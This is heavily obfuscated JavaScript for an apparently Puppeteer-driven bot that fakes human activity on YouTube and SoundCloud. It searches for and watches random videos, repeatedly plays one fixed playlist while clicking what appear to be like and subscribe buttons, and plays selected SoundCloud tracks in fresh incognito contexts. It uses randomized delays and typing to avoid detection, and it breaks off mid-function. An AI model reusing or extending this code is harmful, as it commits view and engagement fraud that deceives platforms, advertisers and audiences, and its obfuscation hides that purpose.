const Z = b,
  Y = d,
  X = c;

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0xe * 0x22d + 0x7 * -0x5 + -0x1e53);
    let h = e[f];
    return h;
  }, d(b, c);
}

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x2f5 * -0x3 + -0x1265 + -0x3 * -0x917))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1457 * 0x1 + -0x22d9 + 0x3730), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x16f * 0x1 + 0x45 * -0x327 + -0x2 * -0xa811 + (-0x437b + 0x31 * -0x87 + 0x97ea) * random()) : await standardWaitForNetIdle(f), await wait(0x1ab3 * -0x1 + 0x53c * 0x5 + 0x140f + (-0x26f8 + 0x2c65 + 0x21a3) * random()), -0xabb + 0x4af * 0x5 + -0xcaf;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x12 * 0x1c9 + -0x1e0b + 0x1 * 0x51b5), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x176c + -0x17de + 0x2f4b * 0x1;
}
async function randomWait() {
  return await wait(0xc * 0xdf + 0xb57 * 0x1 + -0x243 + (0xefa + -0x36f * -0x7 + 0x1 * -0x137b) * random()), -0x1e53 + 0x3 * 0x63e + 0xb9a;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x2 * -0xf52 + -0x2444 + 0x5a0, -0x1023 + -0x1 * -0x3b9 + 0xc71), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x1 * -0xadec + 0x354 * -0x7c + 0x1d924) * getRandomInt(0x13d * 0x1b + 0x2 * -0x11cd + 0x22d, 0x10f8 + 0x141 * 0x1f + -0xa * 0x595), h)), -0x1852 + -0x43 * -0x28 + 0xddb;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0xc89 + -0x3bf * -0xa + -0x1 * 0x31ff;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x1 * -0xe45 + -0x66a * 0x1 + 0x14b0]['split']('\x20');
    for (let k = -0x10 * 0x29 + 0x3 * 0x529 + -0xceb * 0x1; k < i['length']; k += 0x3 * 0x583 + -0xb97 + -0x4f * 0x10)
      j += i[k] * h[i[k + (0x1 * -0x60b + -0x23 * 0x89 + 0x1 * 0x18c7)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x20b2 + -0x204f + -0x5d)['map'](l => Array['from'](l['children']))['flat'](0x8 * 0x422 + 0xe73 + -0x1 * 0x2f82)['map'](l => l['childNodes'][0x16f6 + -0xb2d + -0xbc8]['childNodes'][0xe4 + 0x2067 + -0x9 * 0x3b3]['childNodes'][0x12b8 + -0x2231 + -0x11b * -0xe]['childNodes'][-0x671 + -0xb03 * -0x1 + -0x492]['childNodes'][0x1392 + 0x12 * 0x205 + -0x37eb]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x1 * 0x1238 + -0xa34 + 0x102a * 0x2, -0x1f * 0x137 + 0xc9 + 0x169 * 0x28)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x1 * 0x5fce + 0x4 * -0x66b + 0x7 * -0x1a6);
  const h = await getMaxTime(f),
    i = Math['min']((0x1caf5 + -0x14082 + 0x5fed) * getRandomInt(0x1ac4 + -0x2238 + -0x2 * -0x3bb, 0x8 * -0x167 + -0xb * -0x153 + 0x6 * -0x8e), h);
  return await wait(i), -0x1981 * -0x1 + 0x244 + 0x4 * -0x6f1;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x675 + -0x13 * -0x9f + -0x558]['children'][0x18 * -0x13d + -0x2328 + 0x40e0]['children'][-0x4 * -0x622 + -0x4 * 0x74c + 0x4a8]['children'][-0x72c + 0x1f * 0x9d + 0x1b1 * -0x7]['children'][0x13b0 + 0x1 * 0xe7d + -0x222d * 0x1]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x1bc9 + -0xb7b * 0x1 + 0x56f * -0x3;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    const R = d;
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', R(0x1) + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x146a + -0x9a9 * 0x2 + 0x2d * -0x4 + (0x247 * -0x1 + 0xffe + -0xd85) * random()
  }), await wait(0x35 * -0x1d + 0x1 * -0x21e5 + 0x3ce * 0xb + (-0x1f83 + 0x18d4 + 0x7db) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x57 * -0x2d + 0x19fb + -0x2944]['childNodes'][0x2112 + 0x79 + -0x218a]['childNodes'][0x218e + -0x1159 + -0x7a * 0x22]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x19c3 * 0x1 + 0x351 + 0x3 * 0x77d]['childNodes'][-0x199 + 0x1 * -0xa31 + 0x1 * 0xbca]['childNodes'][-0x29b + -0x22e8 + 0x2585]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x3c * -0x36 + 0x158c + -0x8e3),
          r = 0x1c0b + -0x685 + -0x1586;
        for (let u = -0x140c * 0x1 + -0x13f1 + -0x1 * -0x27fd; u < q['length']; u += 0x138a + 0x9 * 0x23d + -0x27ad * 0x1)
          r += q[u] * k[q[u + (0x112a + -0x1464 + 0x33b)]];
        return r;
      }(n);
  });
  await wait((0x5c4a + 0x1f0e + -0x40c0) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x824a + 0x1 * 0xb5fd + 0x197 * -0x31) * getRandomInt(-0x77 * 0x3 + -0x1365 + 0x14cb, -0xa99 + -0x1 * 0xbe6 + 0x783 * 0x3), h + (-0x7 * 0x15b + -0x2f9 * -0x5 + 0xe28));
  return await wait(i), 0x1 * -0x320 + 0xb1f + -0x7fe;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x52 * -0x5b + 0x1c69 + -0x3f * -0x3), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        const S = b;
        document[S(0x13, '(tEm') + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x1 * 0x79d + -0x189f + 0x3a * 0xc2 + (-0x230f + 0x1dbc + 0x11 * 0x8b) * Math['random']());
    });
  }, -0x34a0 + 0x95 * -0x4a + 0x7b0a);
  await wait(-0x1 * -0x4116b + -0x67fc + 0xea71);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x5f44 * 0x1 + 0x113d + 0x1169 * 0x7) * getRandomInt(0x1 * 0xcc5 + 0x1 * 0x82b + -0x14ec, 0x1c23 + 0x22d0 + -0x3eda)), clearInterval(h), 0x1 * -0x24d4 + -0x1 * -0x23f8 + 0xd * 0x11;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x2055 + 0x1f6 * -0x4 + -0x187d;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x81 * -0x43 + -0x246 * 0x7 + -0x23b * 0x8;
    await randomWait();
  }
  return -0xc8d + -0x2 * 0x248 + 0x272 * 0x7;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0xe * 0x22d + 0x7 * -0x5 + -0x1e53);
    let h = e[f];
    if (c['rhXgHP'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x1594 + 0x3fa + 0x2 * 0x8cd, r, s, t = 0x1130 + 0x88d + -0x1 * 0x19bd; s = m['charAt'](t++); ~s && (r = q % (-0x1265 * 0x1 + -0x2 * -0x3d3 + 0xac3) ? r * (-0x22d9 + 0x2504 + -0x1eb) + s : s, q++ % (-0x3d * 0x1 + 0x1 * -0x2441 + -0x1 * -0x2482)) ? o += String['fromCharCode'](-0x167e + 0x23 * -0x3f + 0x201a & r >> (-(0x1ab3 * -0x1 + 0x53c * 0x5 + 0x89) * q & -0x137c + 0x1633 + -0x2b1)) : -0xabb + 0x4af * 0x5 + -0xcb0) {
          s = n['indexOf'](s);
        }
        for (let u = -0x12 * 0x1c9 + -0x1e0b + 0x1 * 0x3e2d, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x176c + -0x17de + 0x13f * 0x26))['slice'](-(0xc * 0xdf + 0xb57 * 0x1 + -0x15c9));
        }
        return decodeURIComponent(p);
      };
      c['pfYCsL'] = i, b = arguments, c['rhXgHP'] = !![];
    }
    const j = e[0xefa + -0x36f * -0x7 + 0x1 * -0x2703],
      k = f + j,
      l = b[k];
    return !l ? (h = c['pfYCsL'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function fetchRandomSC() {
  return Math['random']() <= 0x301 + -0x4 * -0x242 + -0x403 * 0x3 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x994 * -0x4 + 0xcf1 + 0x195f + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const U = b;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x106 + 0x46 * 0x25 + -0x3e * 0x2e + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0xc77 + -0x183a + 0x3 * 0xc3b;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const T = d;
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + T(0x5) + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0xddf1 + -0x1 * -0x5941 + -0x876a + getRandomInt(-0x1 * -0x133b + -0x22bb + 0x4a18, 0x1777 + -0x8918 + -0xe6d1 * -0x1));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x5 * -0x43a + 0x26 * 0xc5 + -0x53 * 0x19), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x533 * -0x2 + -0x1029 + -0xd * -0x20b;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v[U(0x9, 'VIq1')](-0xa4 * -0x37 + 0x13 * -0x1be + -0x5b * 0x6, -0x155f + -0x1a67 + 0x2ff8)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x1bff + 0x26fb * 0x1 + -0x32c + floor((0x15fc + 0x7a * 0x7 + 0x156a * -0x1) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x22460afc + -0x37081c24 + 0x6 * 0x2437b130),
          -0x214de1 + -0x37289d + 0xd8767e,
          -0xa1f5 * 0x1 + 0x1ae + -0x12047 * -0x1,
          -0x1b06 * -0x1 + 0xb35 + -0x2e7 * 0xd
        ], y = [
          -0x110b + 0x1dfd + -0x7 * 0x1d6,
          0x615 * -0x2 + -0x17f4 + 0x242e,
          -0xbff * -0x2 + 0x215 + -0x1a0b,
          -0xe * 0x231 + 0xf61 * -0x1 + -0xd * -0x38b
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x24 * -0xd6 + 0x4 * -0xe6 + 0x159 * 0x19)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x2425 + 0x6da * 0x1 + 0xe55 * -0x3; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x3d * -0x6c + -0x179 * 0x10 + -0x22c) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x1146 * 0x2 + 0x43 * -0x83 + 0x44d5] = A[0x1c86 + 0x2238 + -0x1f57 * 0x2] = A[-0x75 * -0x22 + -0xb * -0x71 + -0x1464] = A[0x1021 + 0x71e + -0x173d] = A[-0x1 * -0x13d5 + -0x19 * 0x40 + -0x2 * 0x6c9] = A[-0x1c05 * 0x1 + -0x1e42 + -0x1 * -0x3a4b] = A[0x41 * 0x31 + 0x228c + -0x2ef8] = A[0xc0a + -0x2 * -0x513 + 0xb15 * -0x2] = A[-0x790 + 0x1 * -0x12cd + 0x699 * 0x4] = A[-0x2005 + 0x1e0 + 0x1e2d * 0x1] = A[0x7e2 + 0x1 * -0x144b + 0x76 * 0x1b] = A[-0x1fd4 + -0x1e97 * -0x1 + -0x6d * -0x3] = A[-0x17 * -0x6f + -0x1636 * 0x1 + -0x106 * -0xc] = A[0xea0 * 0x2 + -0x1cb2 + -0x82] = A[0xd1b * -0x1 + -0x1175 + -0x1cd * -0x11] = A[0x67 * 0x45 + -0x7ef * -0x1 + 0x1 * -0x23a4] = A[0x1 * -0x18da + -0x3 * -0xa1 + 0x7 * 0x34a] = -0x419 + -0x3 * -0x164 + -0x13, this['blocks'] = A) : this['blocks'] = [
                -0x4 * -0x687 + -0x7f * -0x10 + -0x220c,
                -0x16d4 + -0x2397 + -0x3 * -0x1379,
                -0x1cb5 + 0x1575 * 0x1 + -0x1d0 * -0x4,
                -0x233d + -0x1313 * 0x2 + 0x1 * 0x4963,
                0x26a8 + 0x7b7 * 0x1 + 0x9 * -0x527,
                -0x1f45 + -0x19a0 + 0x38e5,
                -0x29 * -0x92 + -0x1 * 0xe75 + -0x8ed,
                -0x1155 + -0x203 * 0x2 + 0x155b,
                -0x155c + -0x1 * -0x1543 + 0x19 * 0x1,
                -0xb * -0xf5 + 0x1a7a + -0x2501,
                -0x18ed * 0x1 + 0x1816 + 0xd7,
                -0x613 * 0x1 + -0x5 * 0x2fb + 0xa * 0x219,
                0xe * 0x153 + -0x839 + -0xa51,
                0xa69 + 0x10fd * 0x2 + -0x2c63,
                0x2289 + -0x1e8b * -0x1 + -0x4114,
                0x1a5f + 0x665 + -0x20c4,
                0xd07 + -0xd * 0x3c + -0x9fb
              ], this['h0'] = -0x22439 * 0x4b6d + -0x28 * 0xe51722 + 0x12c96df96, this['h1'] = 0xac422ccd + 0x5533ca16 + 0x5 * -0x3880f12, this['h2'] = 0x461166b6 * 0x4 + -0x3f77bea9 * 0x1 + -0x4012ff31, this['h3'] = 0x278fcf3 * 0x9 + -0x1540d2df + 0xf3242ca, this['h4'] = 0x1544 * 0xa383e + 0x84e66578 + -0x9a678a00, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x8c * 0x6 + 0x298 * -0x1 + -0x2f * -0x20, this['finalized'] = this['hashed'] = -0x1c55 + 0xa * 0xc0 + 0x14d5, this['first'] = 0x13 * -0x1bb + 0x918 + 0x17ca;
            }
            ['update'](J) {
              const V = b;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0xd7e + -0x18eb + 0x2669, O = J['length'] || -0x1bf6 + 0x1 * -0x11d8 + -0x42a * -0xb, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x14ef + -0x19 * -0x11d + -0x6e6, P[-0x19ac + 0xa3 * 0x30 + 0x139 * -0x4] = this['block'], P[-0xbb0 * -0x1 + -0x17b7 * -0x1 + 0x2357 * -0x1] = P[0x214f + -0x84d + 0xad * -0x25] = P[0x2 * -0xe2 + 0x1ae3 + -0x191d] = P[-0x309 * 0x1 + 0x248e + -0x2 * 0x10c1] = P[-0x729 * -0x3 + -0x1264 + -0x313] = P[-0x1438 + -0x19c4 + 0x2e01 * 0x1] = P[-0x1e94 + 0x251f + -0x685] = P[-0x5 * 0x65a + 0x77d * 0x3 + 0x952] = P[0x15c7 + -0x2665 * 0x1 + 0x10a6] = P[0x9 * -0xa6 + -0x295 + 0x874] = P[0xd5d + 0xdc2 + -0x1b15 * 0x1] = P[0x1c6b + 0x778 + 0x8f6 * -0x4] = P[0x1255 + -0xa * -0xb + 0x63d * -0x3] = P[-0x1d * 0x4d + 0x37e * 0xb + -0x1da4] = P[-0x68 * -0x56 + 0x6d9 * -0x3 + -0x1 * 0xe57] = P[-0x7 * -0x591 + 0x232 * -0x4 + 0x788 * -0x4] = -0x352 + -0x2 * -0x211 + -0xd0), K) {
                    for (N = this['start']; M < O && N < -0xc31 + -0x114f + -0x44 * -0x70; ++M)
                      P[N >> 0x19d4 + -0x1f2e + -0x2 * -0x2ae] |= J[M] << y[0x152 + 0x71 * -0x1 + -0x25 * 0x6 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x1422 * -0x1 + -0xab3 + 0x1f15; ++M)
                      (L = J['charCodeAt'](M)) < 0x1 * -0xd12 + -0x37d * 0x5 + 0x1f03 * 0x1 ? P[N >> -0x78e + 0x14c8 + -0xd38] |= L << y[0x1cf * 0x8 + -0x1 * -0xd0f + -0x1b84 & N++] : L < 0x35 * 0x71 + -0xa30 + -0x2b * 0x1f ? (P[N >> -0x3b3 * -0x1 + -0x150f + -0x156 * -0xd] |= (0x1 * 0x939 + -0x8 * 0x5d + -0x591 | L >> 0x4af * 0x1 + 0x114c + -0x4d * 0x49) << y[0x2088 + -0x4ce * -0x2 + -0x2a21 & N++], P[N >> 0x791 + -0x4e8 + -0x1 * 0x2a7] |= (0x1a5a + 0x10ca + 0x2aa4 * -0x1 | 0x1 * 0x95 + -0x1 * -0xa4 + -0x2 * 0x7d & L) << y[0x21c0 * -0x1 + 0xb * -0xac + 0x2927 & N++]) : L < 0x61c9 + 0x2 * -0x5c6 + 0x81c3 || L >= -0x11832 + -0x6fd1 * -0x1 + 0x18861 ? (P[N >> -0x16db * 0x1 + -0x3 * -0x4b3 + -0xc * -0xbb] |= (-0x15f1 + 0x184e + -0x17d | L >> 0x14da + -0x1 * -0x1841 + -0x903 * 0x5) << y[0x2 * 0xe4a + -0x4a * 0x9 + 0x187 * -0x11 & N++], P[N >> 0x1629 + 0x372 + -0x1999] |= (0x9d * 0x2c + -0xc28 * 0x3 + 0x4 * 0x27f | L >> -0x163 * -0xc + 0x1183 * 0x1 + -0x2221 * 0x1 & -0x1bd8 + 0xa2c + -0x21 * -0x8b) << y[-0x2244 + -0x5ec * -0x1 + 0x77 * 0x3d & N++], P[N >> 0x133 * 0x11 + 0x12d1 * 0x2 + -0x3a03 * 0x1] |= (0x1 * 0x16c7 + -0x859 * 0x1 + 0x2 * -0x6f7 | -0x1b04 + -0x77b + -0x22be * -0x1 & L) << y[-0x2121 + 0x11 * 0x1d5 + 0x7 * 0x49 & N++]) : (L = -0x3 * -0x4963 + 0x3212 + 0x1 * -0xe3b + ((-0x38c * -0x2 + -0x13c * -0x1a + -0x2331 & L) << 0x1319 + -0x1c6f + 0x960 | 0x18de + 0xa5d + -0x1 * 0x1f3c & J['charCodeAt'](++M)), P[N >> -0x9df + 0x34 * 0x42 + 0x15 * -0x2b] |= (0x2c * -0x32 + 0x1781 + -0xdf9 | L >> 0x2300 + -0xd71 + -0x157d) << y[-0x622 + -0x17 * 0xe9 + 0x1b14 & N++], P[N >> -0x225 + -0x1 * 0x1731 + -0x656 * -0x4] |= (-0xfb6 + -0x13cd + -0x3 * -0xc01 | L >> -0xb * -0xfe + -0x5c1 + -0xb * 0x77 & -0x175d * -0x1 + -0x201 + -0x151d) << y[-0x213d + 0x17 * -0x17e + 0x4392 & N++], P[N >> -0xeea + -0x1 * -0x691 + 0x85b] |= (0x1dcb + 0x2 * 0xe3 + -0x1f11 | L >> 0x19 + 0x392 * 0x1 + -0x3a5 & -0x830 * -0x3 + -0x4 * -0x2e2 + -0x23d9) << y[-0x11 * 0x65 + -0x47 * -0x5a + 0x1d3 * -0xa & N++], P[N >> 0xf51 + -0x24 * 0x7e + 0x269 * 0x1] |= (-0x9db * -0x1 + -0x2c * 0x84 + 0xd55 | 0x1 * 0xbf2 + -0xda0 + 0x1ed & L) << y[0x16c + -0x7dd + 0x674 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x1 * 0x16b7 + -0xfaa * -0x1 + -0x59 * -0x15 ? (this['block'] = P[0xb01 + -0x1 * -0x1733 + 0x6d4 * -0x5], this['start'] = N - (-0x1 * 0x2565 + 0xa34 + 0x1b71), this['hash'](), this[V(0xa, 'ngU*')] = 0x140c + 0xddc * 0x1 + -0x21e7) : this['start'] = N;
                }
                return this['bytes'] > 0x1f053aaa3 + 0x196b6860f + -0x2870a30b3 * 0x1 && (this['hBytes'] += this['bytes'] / (-0xa06cb * -0x287c + 0x4e466714 + -0xe4316968) << 0xdcd * -0x1 + -0x1 * -0x260f + -0x1842, this['bytes'] = this['bytes'] % (-0x2a520371 * -0xc + -0x892 * 0xb8d7e + 0xc * -0xcbc75f4)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x12c6 + -0xf89 * 0x2 + 0x31d9;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x1c6c + 0x1f63 + -0x3bbf] = this['block'], J[K >> -0x1d22 * -0x1 + -0xc05 + -0x111b] |= x[0x1 * -0x167 + -0x1373 + -0x1 * -0x14dd & K], this['block'] = J[-0x1 * -0x1ca3 + 0x2618 + -0x42ab], K >= 0x97c + -0x650 + -0x2f4 && (this['hashed'] || this['hash'](), J[-0xa8e * -0x3 + 0x1956 + -0x3900] = this['block'], J[-0x23b8 + -0x5a1 * -0x3 + 0x12e5] = J[0x56e * 0x1 + -0x291 + 0xb7 * -0x4] = J[-0x1af * 0x11 + 0x1 * -0x7bb + 0x245c] = J[0x103a + -0xd74 + -0x2c3] = J[-0xc07 + 0x1 * 0xf2e + -0x323] = J[-0x215b + 0x1ed4 + 0x28c] = J[-0x1 * 0x214a + 0x35c + -0x12 * -0x1aa] = J[0x2104 + -0x19d4 + 0x729 * -0x1] = J[-0x123 * -0x2 + 0x2140 + -0x11bf * 0x2] = J[0xa44 * 0x3 + 0xf37 + -0x2dfa] = J[0x1d9f + -0x12 * -0x5e + -0x2431] = J[0x35d * 0x1 + -0xec * -0x1e + 0x1 * -0x1efa] = J[-0x1f85 * 0x1 + 0x23e * 0x4 + 0x1699] = J[0x6f * 0x7 + 0x26f2 * 0x1 + -0x29ee] = J[-0x2f9 * -0x7 + 0x2488 + 0x5 * -0xb75] = J[-0x842 + -0x4f * -0x26 + -0x9 * 0x61] = 0x1dfc + -0x8 * -0x355 + 0x64 * -0x91), J[0x2a6 + -0x13ef + 0x1157] = this['hBytes'] << 0x22 * 0x9a + -0x537 + -0xf3a | this['bytes'] >>> -0x1a76 * 0x1 + 0x5 * -0x476 + -0x61 * -0x81, J[0xc42 + -0xb56 + -0xdd] = this['bytes'] << 0x1 * 0x1a97 + -0x21 * -0x8b + -0x2c7f, this['hash']();
              }
            }
            ['hash']() {
